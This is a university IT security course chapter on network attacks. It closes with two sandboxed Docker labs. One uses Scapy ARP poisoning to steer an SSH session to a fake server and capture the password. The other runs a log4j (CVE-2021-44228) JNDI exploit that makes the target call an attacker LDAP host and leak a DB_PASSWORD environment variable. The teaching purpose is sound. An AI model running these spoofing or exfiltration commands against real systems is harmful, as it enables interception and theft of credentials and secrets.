= Attacks (WIP)

== Interception Attacks

Interception attacks rely on the ability to intercept network communications.
This may be due to the nature of the network being used or sometimes other methods may leveraged to better position the attacker.
These attacks generally involve forging fictitious messages, recording transmitted data, or altering the contents of messages while on a network.
This family of attacks places all parts of the CIA triad at risk.

=== MitM

[svgbob, mitm, float=right, width=400]
....
.-----------.                         .------------.
|   User    | <- - - - - X - - - - -> | Web Server |
'-----------'     "Old Connection"    '------------'
     ^                                       ^
     |         .-------------------.         |
     +-------> | Man in the Middle | <-------+
               '-------------------'
                   New Connection
....

A man in the middle attack is a blanket term applied when an attacker is intercepting communication.
A typical attack involves eavesdropping and possibly modifying messages between two parties.
Encryption can be used to mitigate the attack, making it impossible for an attacker to decrypt the messages they are intercepting.
That being said, particular attention must be paid to the handshaking/key exchange protocol to be sure that an attacker does not gain access to the key(s) being used.
What follows is an example of MitM being used to intercept and modify the public key exchange:

[svgbob, mitm-keys, width=500, align=center]
....
.-----.                                                 .-----.
| Bob |                                                 |Alice|
'--+--'                                                 '--+--'
   |    Send me your public key so I can send a secret     |
   |------------------------------------------------------>|
   |                                                       |
   | My public key is WXGZ .------.  My public key is ABCD |
   |<----------------------| MitM |<-----------------------+
   |                       '---+--'                        |
   |"Secret (encrypted w/WXGZ)"|"Secret (encrypted w/ABCD)"|
   |-------------------------->|-------------------------->|
....

In the above example the MitM allows the first message to pass unmolested, but tampers with the exchange of the public key.
By passing it's own public key to Bob, the MitM has to ability to decrypt the messages that Bob sends and can still use Alice's public key to re-encrypt the messages at pass them to her.
You can see how if two public keys are exchanged in this manner it would be possible to set up a MitM attack where despite encryption all messages can be seen.

=== MitB

MitB stands for man in the browser and is typically caused by a trojan installing malware that allows the attacker to intercept/modify communications between the browser and the server.
This can be used to capture data on forms, modify input, or modify the response from the server.
Often the software used in MitB attacks lays dormant until the victim browses to a targeted website.
What follows is an example of how a MitB attack can be used to modify an online banking request to send money:

[plantuml, mitb, svg, width=900, align=center]
....
@startuml
skinparam Shadowing false
skinparam RectangleBackgroundColor White
skinparam RectangleBorderColor White
skinparam defaultTextAlignment center
skinparam componentArrowColor Black

!include <tupadr3/common>
!include <tupadr3/font-awesome/server>
!include <tupadr3/font-awesome/user>
!include <tupadr3/font-awesome/laptop>
!include <tupadr3/font-awesome/chrome>
!include <tupadr3/font-awesome/user_secret>

FA_USER(user, User)
FA_LAPTOP(workstation, Workstation)
FA_CHROME(browser, Browser)
FA_USER_SECRET(attacker, Attacker)
FA_SERVER(server, Web Server)

user -> workstation: malware downloaded to workstation
attacker <--> browser
browser -> workstation: approved $1,000
workstation -> browser: transfer $1,000
browser -> server: transfer $10,000 to Attacker
server -> browser: approved $10,000 to Attacker
@enduml
....

As you can see the attacker ended up with $10,000 and the victim simply thought they authorized a payment of $1,000 to someone else.
These attacks can be difficult to detect because they take place within the browser and are opportunistic.

=== Replay Attacks

This family of attacks typically involves a MitM making a copy of the transmission and _replaying_ it to impersonate the victim.
Logon credentials, simple hashes, and specific commands are sometimes susceptible to this type of attack.
The solution is to use timestamps, nonces, rotating keys, or a counter to make sure commands cannot be executed outside of context.

.One-time Passwords
****
To help mitigate replay attacks, an online banking application may require that client use a one-time password (OTP) when submitting transactions.
An OTP is a frequently changing value that is known to both the client and the server.
Several one-time password schemes exist, most of which make use of a cryptographic hash function with a shared seed between client and server.
Periodically the client and server update to a new hash based on the seed and without the seed it is impossible to know what the next hash will be.
By using an OTP anyone who intercepts the traffic will not be able to perform a replay attack as the password will not be current.
****

=== SSL Circumvention

.MitM preventing HTTPS upgrade and skimming passwords
[svgbob, ssl-mitm, width=500, float=right]
....
.--------.                   .----------.                  .---------.
| Victim |                   | Attacker |                  | "Server"|
'---+----'                   '-----+----'                  '----+----'
    |                              |                            |
    |    "GET http://njit.edu"     |                            |
    |----------------------------->|                            |
    |                              |   "GET http://njit.edu"    |
    |                              |--------------------------->|
    |                              |                            |
    |                              |        "301 Moved"         |
    |                              |<---------------------------|
    |                              |                            |
    |                              |   "GET https://njit.edu"   |
    |                              |--------------------------->|
    |                              |                            |
    |                              |       "200 OK (HTTPS)"     |
    |                              |<---------------------------|
    |        "200 OK (HTTP)"       |                            |
    |<-----------------------------|                            |
    |                              |                            |
    |    "POST http://njit.edu"    |                            |
    |       "username=admin"       |                            |
    |       "password=admin"       |                            |
    |----------------------------->|                            |
    |                              |   "POST https://njit.edu"  |
    |                              |       "username=admin"     |
    |                              |       "password=admin"     |
    |                              |--------------------------->|
    |                              |                            |
    |                              |<---------------------------|
    |                              |                            |
    |<-----------------------------|                            |
....

If you think about the intercepted key exchange given in the above MitM example, a similar attack can allow attackers to view SSL traffic.
The attacker gives the victim a bogus certificate authority (CA) certificate which the victim installs.
This is often accomplished via a trojan.
Then the attacker places themselves in the middle of an uninitiated secure connection.
During the key exchange the attacker creates a custom certificate signed by a bogus CA for the connection between attacker and victim.
The attacker also makes an actual HTTPS connection to the service and proxies data for the victim.
All of the victims data will show up in plaintext for the attacker but the connection will appear to be secure for the victim. 
This is used in the https://www.telerik.com/fiddler[Fiddler] debugging proxy to decrypt HTTPS traffic and is also used in some network appliances that perform deep packet inspection.

Another MitM attack on SSL is simply to maintain or downgrade to an HTTP connection with the victim and proxy data to an actual HTTPS connection with the server.
Most servers will upgrade an insecure connection, but by intercepting that exchange the attacker can continue to monitor the victim's traffic.

== Layer 2 Attacks

=== MAC Spoofing/MAC Cloning

Most networks expect that a MAC address will correspond to the unique numbers on a NIC, but it is actually quite easy to change.
Virtual networking necessitates the ability to use a different MAC address and this feature is built into most modern operating systems.
MAC spoofing is when an attacker sets their MAC address to the MAC address of another machine on the network in an effort to initiate an attack.
For example, them may set themselves up as a gateway to launch a MitM attack.

=== MAC Flooding

Switches are tasked with keeping track of which MAC addresses correspond to which ports on the switch.
They use this to make sure that traffic is only routed where it needs to go.
Given that MAC addresses can be changed, an attacker could flood a switch with packets from many different MAC addresses and possibly overflow the MAC-port routing table.
Some switches may default to hub-like functionality and send frames to all ports in an effort to keep traffic flowing.
This then allows an attacker to capture traffic from other machines on the network.

=== ARP Poisoning

[.float-group]
--

image::arp.svg[width=500, float=left]

An attacker may also use ARP packets to impersonate another machine on the network, such as a gateway router.
By repeatedly sending out ARP packets, _gratuitous arp_, redirecting packets bound for the gateway's IP to the attackers MAC address an attacker can set up a MitM scenario.
This is particularly difficult because depending on the TTL of the ARP cache it may take up to 20 minutes for normal network operations to resume.

--

== Layer 3 Attacks

=== IP Spoofing

Unfortunately Internet Protocol (IP) was not designed with security in mind.
This means that by default any IP address can be put in the packet header and the packet will still be forwarded to the network.
This leads to issues where an IP can be _spoofed_ and malicious packets sent out.
At this layer there really aren't any good solutions to this problem.
This means that the sources of packets often need to be authenticated in higher layers and protocols must take into account the fact that the IP layer is fundamentally insecure.

.Smurf Attack
****

[.float-group]
--

[link=https://commons.wikimedia.org/wiki/File:Ataque_Smurf_DDoS.png]
image::smurf.png[width=600, float=right]

The Smurf attack is a great example of how spoofed IP addresses can lead to major problems. 
The Smurf attack is an early type of Distributed Denial of Service attack.
An attacker would create an ICMP echo request with the victims IP address as the source address.
This echo request would be directed at a broadcast IP address for a subnet.
Many of the clients on the subnet would respond the the echo request, flooding the victim with responses.
The asymetric nature of this attack, a single packet prompting possibly hundreds of responses, made it particularly hard to deal with.
Using a Smurf attack, an attacker could keep a victim _pinned down_ with minimal bandwidth required on their end.
Modern clients no longer respond to ICMP echo requests directed at the broadcast, mitigating the risk of this kind of attack.

--

****

== Name Resolution Attacks

=== DNS Cache Poisoning

A DNS resolved can be tricked into caching incorrect information and serving it to other clients.
In this scenario an attacker assumes the role of the authoratative DNS server by responding to a DNS query with a forged source IP.
One of the reasons this is possible is because DNS query responses are often single, unauthenticated packets.
Once the server has the invalid DNS cache entry it will continue to direct users to the incorrect IP address for the TTL of the entry.
https://cloud.google.com/dns/docs/dnssec[DNSSEC] can be used to mitigate these attacks by forcing authentication on DNS answers. 

=== LLMNR Hijacking

In this scenario an attacker responds to a LLMNR broadcast and impersonates an authentication server.
The unexpecting victim fills in their credentials, which are promptly stolen.
This attack can be mitigated by disabling LLMNR on the network.

== Outcomes

=== Remote Code Execution (RCE)

=== Privilege Escalation

=== Denial of Service (DoS)

== Lab: MitM with Scapy

In this lab we will use a fake SSH server, https://github.com/jaksi/sshesame[sshesame], and an interactive packet manipulation program, https://scapy.net/[scapy], to disrupt an ongoing SSH session between victim and server, position ourself in the middle of the traffic, and capture the username and password victim is using.

.IP Addresses Used
[width=50%, float=right]
|===
|Name|IP Address

|server|172.20.0.5
|victim|172.20.0.6
|attacker|172.20.0.7

|===

For this lab our IP addresses are configured statically and are known to the attacker.
It is also assumed that the attacker is on the local network.
Lastly victim has been poorly configured to ignore changes to the host key.
This is not entirely unreasonable as many users just ignore the warnings and clear out the known_hosts file when prompted anyway.

Start by downloading the https://github.com/rxt1077/it230/raw/main/labs/scapy.zip[scapy.zip] file which contains the Docker Compose configuration we will be using.
Uncompress it to a directory where you have write access.
This lab will require us to use three terminal windows/tabs: one for the `docker-compose up` command which will show the output of everything running in the background, one for the victim which will show an SSH session with the server, and one for the attacker which we will use to make the attack.

[svgbob, scapy, width=800, align=center]
....
          "docker-compose up"                            "victim" 
.-------------------------------------.   .-------------------------------------.
|                                 - X |   |                                 - X |
+-------------------------------------+   +-------------------------------------+
|                                     |   |                                     |
| "$ docker-compose up"               |   | "$ ssh server"                      |
|                                     |   |                                     |
|                                     |   |                                     |
|                                     |   |                                     |
'-------------------------------------'   '-------------------------------------'

                                  "attacker"
                    .-------------------------------------.
                    |                                 - X |
                    +-------------------------------------+
                    |                                     |
                    | "$ scapy"                           |
                    | ">>>"                               |
                    |                                     |
                    |                                     |
                    '-------------------------------------'
....

Open three terminals and `cd` into the directory where you uncompressed the lab zip file in each of them.
There should be a `docker-compose.yml` file and `server`, `victim`, and `attacker` directories in the directory you are in.

In the first terminal run the `docker-compose up` command to build the images and run the containers:

.docker-compose up
[source, text]
----
PS C:\Users\rxt1077\it230\labs\scapy> docker-compose up
Creating network "scapy_testnet" with the default driver
Creating scapy_server_1   ... done
Creating scapy_victim_1   ... done
Creating scapy_attacker_1 ... done
Attaching to scapy_victim_1, scapy_server_1, scapy_attacker_1
server_1    | > Starting SSHD
server_1    | >> Generating new host keys
scapy_victim_1 exited with code 0
attacker_1  | INFO 2021/10/07 13:56:45 No host keys configured, using keys at "/root/.local/share/sshesame"
attacker_1  | INFO 2021/10/07 13:56:45 Host key "/root/.local/share/sshesame/host_rsa_key" not found, generating it
attacker_1  | INFO 2021/10/07 13:56:45 Host key "/root/.local/share/sshesame/host_ecdsa_key" not found, generating it
attacker_1  | INFO 2021/10/07 13:56:45 Host key "/root/.local/share/sshesame/host_ed25519_key" not found, generating it
attacker_1  | INFO 2021/10/07 13:56:45 Listening on [::]:22 <1>
server_1    | ssh-keygen: generating new host keys: RSA DSA ECDSA ED25519
server_1    | >>> Fingerprints for dsa host key
server_1    | 1024 MD5:a5:e6:e9:38:d2:2e:88:fd:f0:aa:a8:05:07:35:5f:18 root@a010fe3c2f3c (DSA)
server_1    | 1024 SHA256:NM7DONpt1doZp4e6WV+6WVVr+KUrh9luUSRcAhnzdyw root@a010fe3c2f3c (DSA)
server_1    | 1024 SHA512:LHfFdSk1XiAKQArH0CW+RkaKv5GgovPCH7UIQ+P4T2LbgGpCBP5aGA1V3oriYbTZWuS9TlUgDbEfTBq19AV/cA root@a010fe3c2f3c (DSA)
server_1    | >>> Fingerprints for rsa host key
server_1    | 3072 MD5:74:44:b6:a2:74:b9:7e:1b:ba:3d:27:b8:19:3a:48:df root@a010fe3c2f3c (RSA)
server_1    | 3072 SHA256:mubm9mLNrdNDk5fyj0dghDBIbbwcVKXo23Qdv61/S/c root@a010fe3c2f3c (RSA)
server_1    | 3072 SHA512:JFQhS6trY7sNqRSwZ+t0uyBb5ddNh9qSLtBrMaa5G7xWzKHpxCuKBSDbvLk4W9JKeQftTU4293UDV9vqCcf/6w root@a010fe3c2f3c (RSA)
server_1    | >>> Fingerprints for ecdsa host key
server_1    | 256 MD5:15:75:5f:9b:72:7c:f0:13:ea:0d:b4:47:b7:62:69:63 root@a010fe3c2f3c (ECDSA)
server_1    | 256 SHA256:4p/Afp/8C2tHn7AePdS7OHCgPxfBamdaLIUg4IJ7xx4 root@a010fe3c2f3c (ECDSA)
server_1    | 256 SHA512:NnbevqBXFkGQWIirdFsLPnX85q7q/1Y7E4i+BLHLqE3cg2aqkduBJsssyr9+G7bSvq7txvjl9SRmyRAzuDT7DQ root@a010fe3c2f3c (ECDSA)
server_1    | >>> Fingerprints for ed25519 host key
server_1    | 256 MD5:ad:00:61:26:4d:a0:07:be:6b:8e:91:bd:f0:65:e6:14 root@a010fe3c2f3c (ED25519)
server_1    | 256 SHA256:Vl7jQulDsONglP1xbSN+J8nSfCaIER40rHhgy7z/BYg root@a010fe3c2f3c (ED25519)
server_1    | 256 SHA512:WkmvOWe6oaZ/qE1ZiA0rZAjn9H+hCDxI8NHpsjRNCalK/CgVV9+VhkzHgRTKfKTqQeE0y/Zz2GaEJGv/sapCHg root@a010fe3c2f3c (ED25519)
server_1    | WARNING: No SSH authorized_keys found!
server_1    | >> Unlocking root account
server_1    | WARNING: password authentication enabled.
server_1    | WARNING: password authentication for root user enabled.
server_1    | >> Running: /etc/entrypoint.d/changepw.sh
server_1    | Running /usr/sbin/sshd -D -e -f /etc/ssh/sshd_config
server_1    | Server listening on 0.0.0.0 port 22. <2>
server_1    | Server listening on :: port 22.
----
<1> Notice that attacker has a fake SSH server running in the background
<2> Notice that server has a legitimate SSH server running in the background

In the second terminal run `docker-compose run victim bash` and then from the prompt we'll SSH to server using the password "password":

.victim
[source, text]
----
PS C:\Users\rxt1077\it230\labs\scapy> docker-compose run victim bash
Creating scapy_victim_run ... done
bash-5.0# ssh server
Warning: Permanently added 'server,172.20.0.5' (ECDSA) to the list of known hosts.
root@server's password: <1>
You are now logged into 'server' (presumably from 'victim') via SSH for this assignment.
Leave this connection open while you experiment with scapy from 'attacker'.
bf9ebe42a108:~#
----
<1> The password is "password"

In the third terminal we'll start by _executing_ (recall that at this point it's already running sshesame in the background) a BASH shell on attacker and configuring it to accept packets not only for its own IP address, but also for the server's IP address.
Once traffic is routed to us, this will allow attacker to also respond to packets destined for 172.20.0.5.

.attacker
[source, console]
----
PS C:\Users\rxt1077\it230\labs\scapy> docker-compose exec attacker bash
root@5195de3d330c:/# ip addr add 172.20.0.5 dev eth0
root@5195de3d330c:/# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: tunl0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/ipip 0.0.0.0 brd 0.0.0.0
3: sit0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/sit 0.0.0.0 brd 0.0.0.0
347: eth0@if348: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:ac:14:00:07 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.20.0.7/24 brd 172.20.0.255 scope global eth0 <1>
       valid_lft forever preferred_lft forever
    inet 172.20.0.5/32 scope global eth0 <2>
       valid_lft forever preferred_lft forever
----
<1> This is the IP we started with
<2> This is an additional IP that attacker believes it has

Now that the attacker system is configured, we'll start up `scapy` interactively:

.attacker
[source, text]
----
root@5195de3d330c:/# scapy
INFO: Can't import matplotlib. Won't be able to plot.
INFO: Can't import PyX. Won't be able to use psdump() or pdfdump().
INFO: No IPv6 support in kernel
INFO: Can't import python-cryptography v1.7+. Disabled WEP decryption/encryption. (Dot11)
INFO: Can't import python-cryptography v1.7+. Disabled IPsec encryption/authentication.
WARNING: IPython not available. Using standard Python shell instead.
AutoCompletion, History are disabled.

                     aSPY//YASa
             apyyyyCY//////////YCa       |
            sY//////YSpcs  scpCY//Pp     | Welcome to Scapy
 ayp ayyyyyyySCP//Pp           syY//C    | Version 2.4.5
 AYAsAYYYYYYYY///Ps              cY//S   |
         pCCCCY//p          cSSps y//Y   | https://github.com/secdev/scapy
         SPPPP///a          pP///AC//Y   |
              A//A            cyP////C   | Have fun!
              p///Ac            sC///a   |
              P////YCpc           A//A   | To craft a packet, you have to be a
       scccccp///pSP///p          p//Y   | packet, and learn how to swim in
      sY/////////y  caa           S//P   | the wires and in the waves.
       cayCyayP//Ya              pY/Ya   |        -- Jean-Claude Van Damme
        sY/PsY////YCc          aC//Yp    |
         sc  sccaCY//PCypaapyCP//YSs
                  spCPY//////YPSps
                       ccaacs
>>>
----

You'll notice that scapy's prompt is >>>, just like python because it _is_ python.
Since we're working in python, let's make our lives easier by defining a few simple variables:

.attacker
[source, text]
----
>>> server_ip = "172.20.0.5" <1>
>>> victim_ip = "172.20.0.6"
----
<1> IPv4 addresses are strings in scapy

Now let's see how scapy allows us to build packets.
We'll make an Ethernet frame, with an IP packet inside it, with an ICMP echo request in that, with the data being set to our name:

.attacker
[source, text]
----
>>> ping = Ether()/IP(dst=server_ip)/ICMP()/"Ryan Tolboom" <1>
>>> ping.show() <2>
###[ Ethernet ]###
  dst       = 02:42:ac:14:00:05
  src       = 02:42:ac:14:00:07
  type      = IPv4
###[ IP ]###
     version   = 4
     ihl       = None
     tos       = 0x0
     len       = None
     id        = 1
     flags     =
     frag      = 0
     ttl       = 64
     proto     = icmp
     chksum    = None
     src       = 172.20.0.7
     dst       = 172.20.0.5
     \options   \
###[ ICMP ]###
        type      = echo-request
        code      = 0
        chksum    = None
        id        = 0x0
        seq       = 0x0
        unused    = ''
###[ Raw ]###
           load      = 'Ryan Tolboom'

>>> result = srp1(ping) <3>
Begin emission:
Finished sending 1 packets.
.*
Received 2 packets, got 1 answers, remaining 0 packets
>>> result.show()
###[ Ethernet ]###
  dst       = 02:42:ac:14:00:07
  src       = 02:42:ac:14:00:05
  type      = IPv4
###[ IP ]###
     version   = 4
     ihl       = 5
     tos       = 0x0
     len       = 40
     id        = 62086
     flags     =
     frag      = 0
     ttl       = 64
     proto     = icmp
     chksum    = 0x301a
     src       = 172.20.0.5
     dst       = 172.20.0.7
     \options   \
###[ ICMP ]###
        type      = echo-reply
        code      = 0
        chksum    = 0xea7a
        id        = 0x0
        seq       = 0x0
        unused    = ''
###[ Raw ]###
           load      = 'Ryan Tolboom'

>>> server_mac = result[0][0].src
>>> server_mac
'02:42:ac:14:00:05'
----
<1> Scapy uses the '/' operator to nest protocols.
    This is my name in an ICMP packet, in an IP packet, in an Ethernet frame.
    Be sure you use your own name!
<2> The `show()` command prints out packets in detail
<3> The `srp1()` function sends and receives _one_ packet at Layer 2

Notice how we use this to capture the server's MAC address and save it in the `server_mac` variable.

[IMPORTANT.deliverable]
====
Take a screenshot of your scapy session at this point showing that you completed an ICMP echo request/response with your name in it.
====

We can also determine MAC addresses at Layer 2 with an ARP "who-has" request.
Let's craft and send a broadcast ethernet frame with an ARP "who-has" request for the victims's IP address.
The result will tell use what the victim's MAC address is:

.attacker
[source, text]
----
>>> whohas = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=victim_ip)
>>> result = srp1(whohas)
Begin emission:
Finished sending 1 packets.
*
Received 1 packets, got 1 answers, remaining 0 packets
>>> result.show()
###[ Ethernet ]###
  dst       = 02:42:ac:14:00:07
  src       = 02:42:ac:14:00:06 <1>
  type      = ARP
###[ ARP ]###
     hwtype    = 0x1
     ptype     = IPv4
     hwlen     = 6
     plen      = 4
     op        = is-at
     hwsrc     = 02:42:ac:14:00:06
     psrc      = 172.20.0.6
     hwdst     = 02:42:ac:14:00:07
     pdst      = 172.20.0.7

>>> victim_mac = result[0].src
----
<1> This is my MAC address of victim, but yours may be different!

This is how an ARP exchange is supposed to work.
We broadcast out asking what MAC we should use for a certain IP and we get a response _from the person who legitimately has that MAC and IP_.

We have everything we need to create an ARP packet telling the victim to send traffic to us when they are trying to access servers IP:

.attacker
[source, text]
----
>>> victim_ip, victim_mac, server_ip, server_mac
('172.20.0.6', '02:42:ac:14:00:06', '172.20.0.5', '02:42:ac:14:00:05')
----

Now let's make and view an evil ARP packet:

.attacker
[source, text]
----
>>> bad_arp = ARP(op=2, pdst=victim_ip, psrc=server_ip, hwdst=victim_mac)
>>> bad_arp
<ARP  op=is-at psrc=172.20.0.5 hwdst=02:42:ac:14:00:06 pdst=172.20.0.6 |>
----

This packet posits itself as coming from the server, it is aimed at the victim in both IP and MAC, but the MAC address that will be used to send it is ours (by default, we don't specify with `hwsrc`).
This means the victim will update their ARP cache such that frames destined for server go to attacker.
This effectively reroutes all layer 2 traffic that was going to the server from the victim.

Go ahead an send that ARP packet:

.attacker
[source, text]
----
>>> send(bad_arp)
.
Sent 1 packets.
----

Now go back to the victim terminal with the SSH connection to server and try typing something.
As soon as SSH has to send data, you will get a broken pipe error and the connection will drop.
Faced with such a problem, what do you think most users will do?
Probably try to reconnect, let's try that too.
Remember the password is "password".

.victim
[source, text]
----
You are now logged into 'server' (presumably from 'victim') via SSH for this assignment.
Leave this connection open while you experiment with scapy from 'attacker'.
bf9ebe42a108:~# client_loop: send disconnect: Broken pipe <1>
bash-5.0# ssh server
Warning: Permanently added 'server,172.20.0.5' (ECDSA) to the list of known hosts.
root@server's password:
#
----
<1> This happened when they tried to type something right after we sent the malicious ARP

Wait, that prompt looks a little different and where's the message about staying logged in?
It turns out the victim actually signed into our fake SSH server and their username and password were logged!
Take a look at the output from the terminal running `docker-compose up`, you'll see the credentials entered:

.docker-compose up terminal
[source, text]
----
attacker_1  | 2021/10/07 01:21:41 [172.20.0.6:60252] authentication for user "root" with password "password" accepted
----

[IMPORTANT.deliverable]
====

[qanda]
How would you create an ARP packet in scapy to reverse the change you made previously and fix the route?::
    {empty}
Would using keys instead of passwords help prevent this kind of attack? Why or why not?::
    {empty}
How would https://www.ssh.com/academy/ssh/host-key[managing host keys correctly] prevent this kind of attack?::
    {empty}

====

To stop the running containers, you can type Ctrl-C in the terminal running `docker-compose up`, exit out of the victim, and exit out of the attacker.

== Lab: Exploiting log4j

In this lab we will examine the log4j vulnerability, https://nvd.nist.gov/vuln/detail/CVE-2021-44228[CVE-2021-44228].
This vulnerability takes advantage of a flaw in a common logging library used by many Java applications, including Apache, neo4j, Steam, iCloud, and Minecraft. 
Any attacker that can cause a message to be logged can use the Java Naming and Directory Interface (JNDI) and cause the target to reach out to another server, LDAP in our example, and load a remote Java class file.
This file can contain any code that the attacker wishes to inject into the server process.

[IMPORTANT.deliverable]
====
Do some research: What versions of log4j are affected by this vulnerability?
====

This lab uses a Docker Compose configuration to simulate a network with an attacker and a target.
The target runs a https://github.com/leonjza/log4jpwn[known-vulnerable, example application] written by leonjza.
This example application logs the `User-Agent` header, request path, and a query string parameter of a request as seen below:

.App.java
[source, java]
----
package com.sensepost.log4jpwn;

import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;

import static spark.Spark.*;

public class App {
    static final Logger logger = LogManager.getLogger(App.class.getName());

    public static void main(String[] args) {

        port(8080);

        get("/*", (req, res) -> {

            String ua = req.headers("User-Agent");
            String pwn = req.queryParams("pwn");
            String pth = req.pathInfo();

            System.out.println("logging ua: " + ua);
            System.out.println("logging pwn: " + pwn);
            System.out.println("logging pth: " + pth);

            // trigger
            logger.error(ua);
            logger.error(pwn);
            logger.error(pth);

            return "ok: ua: " + ua + " " + "pwn: " + pwn + " pth:" + pth;
        });
    }
}
----

[IMPORTANT.deliverable]
====
What port does our vulnerable app run on? 
====

Our attacker container has https://github.com/leonjza/log4jpwn/blob/master/pwn.py[the `pwn.py` script], also by leonjza, which does two things:

. Runs a fake LDAP server in the background on port 8888
. Sends a request with the JNDI URI referencing the fake LDAP server asking for a Java value to leak
. Parses and prints the response

Using this setup we can show how log4j can be used to leak sensitive information from running processes.
We will use it to leak the value of the environment variable `DB_PASSWORD`.
As it isn't uncommon to store secrets in environment variables on running containers, this should suffice to see just how devastating this exploit can be.

Start by downloading https://github.com/rxt1077/it230/blob/main/labs/log4j.zip?raw=true[the zip archive of this lab] and unzipping it in a directory where you have write permissions and can navigate to in a terminal application. Once you've done that, you can bring the lab up by typing `docker-compose up` in that directory. Output should look similar to what you see below:

[source, console]
----
PS C:\Users\rxt1077\it230\labs\log4j> docker-compose up
[+] Running 2/0
 - Container log4j-target-1    Created                                                            0.0s
 - Container log4j-attacker-1  Created                                                            0.0s
Attaching to log4j-attacker-1, log4j-target-1
log4j-attacker-1 exited with code 0
log4j-target-1    | WARNING: sun.reflect.Reflection.getCallerClass is not supported. This will impact performance.
log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.util.log - Logging initialized @815ms to org.eclipse.jetty.util.log.Slf4jLog
log4j-target-1    | [Thread-0] INFO spark.embeddedserver.jetty.EmbeddedJettyServer - == Spark has ignited ...
log4j-target-1    | [Thread-0] INFO spark.embeddedserver.jetty.EmbeddedJettyServer - >> Listening on 0.0.0.0:8080
log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.Server - jetty-9.4.z-SNAPSHOT; built: 2019-04-29T20:42:08.989Z; git: e1bc35120a6617ee3df052294e433f3a25ce7097; jvm 11.0.14+9-post-Debian-1deb11u1
log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.session - DefaultSessionIdManager workerName=node0
log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.session - No SessionScavenger set, using defaults
log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.session - node0 Scavenging every 600000ms
log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.AbstractConnector - Started ServerConnector@401fccd3{HTTP/1.1,[http/1.1]}{0.0.0.0:8080}
log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.Server - Started @960ms
----

You'll notice that the `target` service is up and running the `log4jpwn` example application and that its output goes straight to the screen.
The `attacker` service will exit immediately as it is meant for interactive use and doesn't run anything in the background.
In another terminal, navigate to the lab directory again and run `docker-compose run attacker bash`. This will be the shell that you use to attack the target:

[source, console]
----
PS C:\Users\rxt1077\it230\labs\log4j> docker-compose run attacker bash
root@3971c61303c8:/# <1>
----
<1> Notice how the prompt changes once we are in the container

In the attack shell, use the `ip` command to determine the IPv4 address of your container.
We will need this since the `attacker` container will be listening for connections from `target` once the exploit string is logged.

[source, console]
----
root@3971c61303c8:/# ip addr show dev eth0
58: eth0@if59: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:ac:14:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet <IP_ADDRESS>/16 brd 172.20.255.255 scope global eth0 <1>
       valid_lft forever preferred_lft forever
----
<1> You're IP is _not_ `<IP_ADDRESS>` it is whatever you find in its place!

Once you have the IP address, you can run the `pwn.py` script on the `attacker` container and you should be able to read the `DB_PASSWORD` environment variable on the `target` container.

[source, console]
----
root@3971c61303c8:/# python /pwn.py --listen-host <IP_ADDRESS> --exploit-host <IP_ADDRESS> --target http://target:8080 --leak '${env:DB_PASSWORD}' <1>
 i| starting server on <IP_ADDRESS>:8888
 i| server started
 i| setting payload in User-Agent header
 i| sending exploit payload ${jndi:ldap://<IP_ADDRESS>:8888/${env:DB_PASSWORD}} to http://target:8080/
 i| new connection from <TARGETS_IP>:44050
 v| extracted value: <DB_PASSWORD> <2>
 i| request url was: http://target:8080/
 i| response status code: 200
----
<1> Docker Compose will resolve service names to IP addresses so the target URI doesn't require finding an IP
<2> The value of `DB_PASSWORD` can will be here.

[IMPORTANT.deliverable]
====
What is the database password?
====

[IMPORTANT.deliverable]
====
What steps would you take to mitigate the risk of a deployed application having this vulnerability?
====

== Review Questions

[qanda]
What can MAC address spoofing allow an attacker to do? What steps can be taken to mitigate this risk?::
    {empty}
What is the difference between horizontal and vertical privilege escalation? Give an example of each.::
    {empty}
What is XSS and how can it be used in an attack?::
    {empty}
